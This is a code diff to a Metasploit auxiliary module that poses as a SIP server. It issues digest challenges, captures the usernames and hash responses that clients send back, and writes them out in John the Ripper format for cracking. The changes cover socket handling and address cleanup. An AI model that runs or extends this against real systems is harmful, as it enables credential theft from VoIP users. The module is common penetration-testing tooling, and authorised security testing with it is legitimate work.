@@ -10,6 +10,7 @@
 ##
 
 require 'msf/core'
+require 'rex/socket'
 
 class Metasploit3 < Msf::Auxiliary
 
@@ -83,7 +84,7 @@ class Metasploit3 < Msf::Auxiliary
 		port = @requestor[:port]
 		tag = (0...8).map{65.+(rand(25)).chr}.join
 		nonce = datastore['NONCE']
-		realm = datastore['REALM'] ? datastore['REALM'] : ip
+		realm = datastore['REALM'] ? datastore['REALM'] : sip_sanitize_address(ip)
 		auth = []
 
 		auth << "SIP/2.0 #{code} #{msg}"
@@ -99,24 +100,36 @@ class Metasploit3 < Msf::Auxiliary
 		auth << "Content-Length: 0"
 		auth << ""
 
-		@sock.send(auth.join("\r\n") << "\r\n", 0, @requestor[:ip], @requestor[:port])
+		@sock.sendto(auth.join("\r\n") << "\r\n", @requestor[:ip].to_s, @requestor[:port])
+	end
+
+	# removes any leading ipv6 stuff, such as ::ffff: as it breaks JtR
+	def sip_sanitize_address(addr)
+		if ( addr =~ /:/ )
+			return addr.scan(/.*:(.*)/)[0][0]
+		end
+		return addr
 	end
 
 	def run
 		begin
 			@port = datastore['SRVPORT'].to_i
-			@sock = ::UDPSocket.new()
-			@sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
-			@sock.bind(datastore['SRVHOST'], @port)
+			@sock = Rex::Socket::Udp.create(
+						'LocalHost' => datastore['SRVHOST'],
+						'LocalPort' => @port,
+						'Context'   => {'Msf' => framework, 'MsfExploit' => self} )
 			@run = true
+			server_ip = sip_sanitize_address(datastore['SRVHOST'])
 
 			while @run
-				packet, addr = @sock.recvfrom(65535)
+				res = @sock.recvfrom()
 				@requestor = {
-					:ip => addr[3],
-					:port => addr[1]
+					:ip => res[1],
+					:port => res[2]
 				}
-				request = sip_parse_request(packet)
+				client_ip = sip_sanitize_address(res[1])
+				next if not res[0] or res[0].empty?
+				request = sip_parse_request(res[0])
 				method = request[:method]
 
 				case method
@@ -132,13 +145,13 @@ class Metasploit3 < Msf::Auxiliary
 						response = ( auth_tokens['response'] ? auth_tokens['response'] : "" )
 						algorithm= ( auth_tokens['algorithm'] ? auth_tokens['algorithm'] : "MD5" )
 						username = auth_tokens['username']
-						proof = "client: #{@requestor[:ip]}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}"
+						proof = "client: #{client_ip}; username: #{username}; nonce: #{datastore['NONCE']}; response: #{response}; algorithm: #{algorithm}"
 						print_status("SIP LOGIN: #{proof}")
 
 						report_auth_info(
 							:host  => @requestor[:ip],
-							:port => datastore['SRVPORT'],
-							:sname => 'sip_challenge',
+							:port => @requestor[:port],
+							:sname => 'sip_client',
 							:user => username,
 							:pass => response + ":" + auth_tokens['nonce'] + ":" + algorithm,
 							:type => "sip_hash",
@@ -150,8 +163,8 @@ class Metasploit3 < Msf::Auxiliary
 						if datastore['JOHNPWFILE']
 							resp = []
 							resp << "$sip$"
-							resp << addr[2]
-							resp << @requestor[:ip]
+							resp << server_ip
+							resp << client_ip
 							resp << username
 							resp << auth_tokens['realm']
 							resp << method
